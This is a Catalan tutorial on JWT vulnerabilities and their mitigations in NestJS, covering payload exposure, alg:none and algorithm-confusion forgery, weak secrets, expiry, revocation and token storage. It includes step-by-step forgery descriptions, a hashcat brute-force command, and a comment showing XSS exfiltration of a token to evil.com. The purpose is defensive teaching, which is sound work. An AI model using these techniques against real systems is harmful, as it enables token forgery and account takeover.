**Vulnerabilitats de seguretat comunes en JWTs (p. ex., exposició de dades sensibles en el payload, manca de verificació de signatura, reptes de revocació de tokens). Com es mitiguen aquests riscos en una implementació real?**

## **Recordatori: el JWT no és xifrat**

La confusió més comuna: Els payloads JWT estan codificats, no xifrats. Qualsevol pot decodificar-los. Si dades confidencials s'emmagatzemen dins d'un token, es fan visibles a qualsevol que l'obtingui.

| JWT: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiIsImVtYWlsIjoiYW5uYUBlLmNvbSJ9.abc123              ↓ Base64 decode (qualsevol ho pot fer)Header:  { "alg": "HS256", "typ": "JWT" }Payload: { "sub": "42", "email": "anna@e.com" }Signatura: abc123  ← única part que verifica la integritat |
| :---- |

**Vulnerabilitat 1: Exposició de dades sensibles al Payload**

**El risc:** qualsevol que intercepti el token (XSS, network logs, browser history) pot llegir el payload.

| // ❌ MAL: dades sensibles al payloadconst payload \= {  sub: usuari.\_id,  email: usuari.email,  password: usuari.password,      // ← CRÍTIC: mai passwords\!  targeta: "4111-1111-1111-1111", // ← mai dades financeres\!  ssn: "123-45-6789",             // ← mai dades personals sensibles\!  secret: process.env.API\_KEY,    // ← mai secrets\!};// ✅ CORRECTE: únicament dades no sensibles i necessàriesconst payload \= {  sub: usuari.\_id.toString(),     // ← identificador  email: usuari.email,            // ← per a display, acceptable  rol: usuari.rol,                // ← necessari per a autorització  iat: Math.floor(Date.now() / 1000),  exp: Math.floor(Date.now() / 1000) \+ 3600,};// Principi: el payload és públic → tracta'l com a informació pública |
| :---- |

Els tokens han de contenir únicament informació segura d'exposar si es decodifiquen. Mantenint els tokens mínims es redueix l'impacte si s'exposen.

**Vulnerabilitat 2: L'Atac `alg: "none"`**

L'atac `alg: "none"`: l'atacant estableix l'algoritme a `none` i elimina la signatura. Les biblioteques vulnerables accepten el token com a vàlid.

| Atac pas a pas:1\. Atacant té un JWT legítim (com a usuari normal):   header:  { "alg": "HS256" }   payload: { "sub": "123", "rol": "usuari" }   signature: xyz7892\. Atacant modifica:   header:  { "alg": "none" }          ← canvia l'algorisme   payload: { "sub": "123", "rol": "admin" }  ← s'auto-promou\!   signature: (eliminada)              ← sense signatura3\. Servidor vulnerable:   → Veu "alg: none" → salta la verificació de signatura   → Accepta el token modificat\!   → Atacant ara és admin\!4\. Servidor segur:   → Veu "alg: none" → REBUTJAT (algorisme no permès) |
| :---- |

| // NestJS: mitigació → whitelist explícita d'algoritmes@Module({  imports: \[    JwtModule.register({      secret: process.env.JWT\_SECRET,      signOptions: {        algorithm: 'HS256',  // ← algorisme fix en la signatura        expiresIn: '1h',      },      verifyOptions: {        algorithms: \['HS256'\],  // ← ÚNICAMENT accepta HS256        // → qualsevol altre algorisme (none, RS256...) → rebutjat      },    }),  \],})export class AuthModule {} |
| :---- |

**Vulnerabilitat 3: Algorithm Confusion (RS256 → HS256)**

En un atac d'Algorithm Confusion, un atacant canvia l'algoritme del token de RS256 a HS256. 

Llavors signa el token usant la clau pública del servidor (que sovint és pública). El servidor, veient HS256, usa el seu "secret" (que és en realitat la seva clau pública) per verificar la signatura. 

Les matemàtiques quadren, i l'atacant obté accés no autoritzat.

| RS256 (asimètric):  Servidor firma amb: clau PRIVADA (secreta)  Servidor verifica amb: clau PÚBLICA (accessible a tothom)Atac de confusió:  1\. Atacant obté la clau PÚBLICA del servidor (és pública\!)  2\. Genera un JWT amb alg: "HS256"  3\. Signa el token usant la clau PÚBLICA com a secret HMAC  4\. El servidor vulnerable:     → Veu "HS256" en el header del token     → Usa la seva "clau secreta" (que és la clau pública\!)     → La verificació HS256 amb la clau pública coincideix\!     → Token acceptat → accés d'atacant com a adminMitigació: mai deixar que el header del token dicti l'algorisme |
| :---- |

| // ✅ Mitigació: forçar l'algorisme al servidor, ignorar el del tokenthis.jwtService.verify(token, {  algorithms: \['HS256'\],  // ← el servidor decideix, NO el token  secret: process.env.JWT\_SECRET,}); |
| :---- |

**Vulnerabilitat 4: Secret feble o comprometit**

JWTs signats amb secrets febles es poden trencar per força bruta offline. Secrets filtrats permeten als atacants encunyar tokens vàlids indefinidament. Secrets curts o predictibles, secrets committejats als repositoris, secrets compartits entre entorns.

| \# Atac de força bruta offline amb hashcat:\# L'atacant agafa un JWT i prova tots els secrets possibleshashcat \-a 0 \-m 16500 token.jwt wordlist.txt\# Si el secret és "password123" → trencat en segons\# Si el secret és "secret" → trencat en mil·lisegons\! |
| :---- |

| // ❌ MAL: secrets feblesJWT\_SECRET=secretJWT\_SECRET=mysecret123JWT\_SECRET=development// ✅ BÉ: secret fort generat aleatòriament (mínimo 256 bits)// Generar: node \-e "console.log(require('crypto').randomBytes(64).toString('hex'))"JWT\_SECRET=a3f8d2e1b9c4f7a0e5d8c3b6a9f2e5d8c1b4a7f0e3d6c9b2a5f8e1d4c7b0a3f6// O millor: usar RS256 amb claus asimètriques// → La clau privada només existeix al servidor de signatura// → La clau pública es distribueix a tots els serveis |
| :---- |

**Vulnerabilitat 5: Manca de verificació d'expiració**

| // ❌ MAL: token sense expiracióconst token \= jwt.sign({ sub: userId }, secret);// → El token és vàlid per sempre → si es roba, l'atacant té accés permanent\!// ❌ MAL: verificació que ignora l'expiraciójwt.verify(token, secret, { ignoreExpiration: true });// → Tokens expirats s'accepten com a vàlids\!// ✅ BÉ: tokens de curta durada \+ verificació estrictathis.jwtService.sign(payload, {  expiresIn: '15m',  // ← access token: 15 minuts});// La verificació de NestJS/Passport verifica exp automàticament// Si el token ha expirat → error TokenExpiredError → 401 Unauthorized |
| :---- |

**Vulnerabilitat 6: Revocació de tokens (el problema fonamental del JWT)**

Com que els JWTs son stateless, els servidors no rastregen automàticament els tokens emesos. Sense un mecanisme de revocació, els tokens romanen vàlids fins a l'expiració fins i tot si l'usuari ha fet logout, el compte ha estat compromès, o els permisos han canviat.

| Escenaris crítics on la manca de revocació és perillosa:  → Logout: l'usuari fa logout però el token segueix vàlid 1 hora  → Compte compromès: admin roba el compte, canvia password    → l'atacant segueix usant el token original 1 hora  → Canvi de permisos: es revoca el rol d'admin a un usuari    → el token antic segueix dient "rol: admin" fins que expira |
| :---- |

| // SOLUCIÓ 1: Tokens de vida molt curta (millor equilibri)// Access token: 5-15 minuts → finestra d'atac mínima// Refresh token: 7-30 dies → revocable a la BD// SOLUCIÓ 2: Blacklist de JTI (JWT ID)// Cada token té un identificador únic (jti)const payload \= {  sub: usuari.\_id,  jti: randomUUID(),  // ← identificador únic del token  exp: Math.floor(Date.now() / 1000) \+ 900,  // 15 min};// En el logout o revocació:await redis.setEx(  \`blacklist:${token.jti}\`,  900,  // TTL igual a l'expiració del token  '1');// En cada petició, verificar si el JTI és a la blacklist:@Injectable()export class JwtBlacklistGuard implements CanActivate {  async canActivate(context: ExecutionContext): Promise\<boolean\> {    const token \= this.extractToken(context);    const payload \= this.jwtService.decode(token) as any;    const blacklisted \= await this.redis.get(\`blacklist:${payload.jti}\`);    if (blacklisted) {      throw new UnauthorizedException('Token revocat');    }    return true;  }}// SOLUCIÓ 3: Refresh Token Rotation (la més recomanada)// Quan l'usuari usa el refresh token → s'emet UN NOU i s'invalida l'anterior// Si el refresh token antic es torna a usar → ALARMA: token robat\! |
| :---- |

Si un atacant roba un refresh token i l'usa després que l'usuari legítim ja l'ha rotat, el sistema detecta immediatament el robatori i revoca totes les sessions.

**Vulnerabilitat 7: Emmagatzematge insegur del Token al client**

| // ❌ localStorage: accessible per JavaScript → vulnerable a XSSlocalStorage.setItem('token', jwt);// Un script maliciós pot: fetch('https://evil.com?t='+localStorage.getItem('token'))// ❌ sessionStorage: igual de vulnerable a XSSsessionStorage.setItem('token', jwt);// ✅ HttpOnly Cookie: JavaScript NO pot accedir-hi// El servidor estableix:response.cookie('access-token', jwt, {  httpOnly: true,    // ← JavaScript no pot llegir-la  secure: true,      // ← únicament HTTPS  sameSite: 'strict', // ← protecció CSRF  maxAge: 15 \* 60 \* 1000,  // 15 minuts});// ✅ Alternativa: memory (variable JavaScript)// Avantatge: desapareix en recarregar → finestra d'atac mínima// Desavantatge: l'usuari ha de tornar a fer login en cada recàrregalet accessToken: string | null \= null;  // únicament en memòria |
| :---- |

**El checklist de seguretat JWT per a NestJS**

| // Configuració segura completa en NestJS:// 1\. Algoritme explícit i fortJwtModule.register({  secret: process.env.JWT\_SECRET,     // ← mínim 256 bits  signOptions: {    algorithm: 'HS256',               // ← explícit    expiresIn: '15m',                 // ← curta durada    issuer: 'api.exemple.com',        // ← emissor verificable    audience: 'app.exemple.com',      // ← receptor verificable  },  verifyOptions: {    algorithms: \['HS256'\],            // ← whitelist estricta  },});// 2\. Payload mínim sense dades sensiblesconst payload \= {  sub: usuari.\_id.toString(),  rol: usuari.rol,  jti: randomUUID(),  // ← NO password, NO email complet, NO dades personals};// 3\. Verificació completathis.jwtService.verify(token, {  algorithms: \['HS256'\],  issuer: 'api.exemple.com',  audience: 'app.exemple.com',  // exp es verifica automàticament});// 4\. Revocació via refresh token rotation// 5\. Emmagatzematge en HttpOnly Cookie// 6\. Rotació del secret periòdica |
| :---- |

**Resum: vulnerabilitats i mitigacions**

| Vulnerabilitat | Atac | Mitigació |
| ----- | ----- | ----- |
| **Payload exposat** | Llegir dades sensibles | Únicament dades públiques al payload |
| **`alg: none`** | Eliminar la signatura | Whitelist explícita d'algoritmes |
| **Algorithm confusion** | RS256 → HS256 amb clau pública | Forçar l'algoritme al servidor |
| **Secret feble** | Brute force offline | Secret aleatori ≥256 bits |
| **Sense expiració** | Token vàlid per sempre | `expiresIn` obligatori |
| **Revocació** | Token robat segueix vàlid | Refresh token rotation \+ blacklist JTI |
| **Emmagatzematge** | XSS roba el token | HttpOnly Cookie (no localStorage) |
| **`kid` injection** | SQL/Path injection via header | Sanititzar i validar el `kid` |

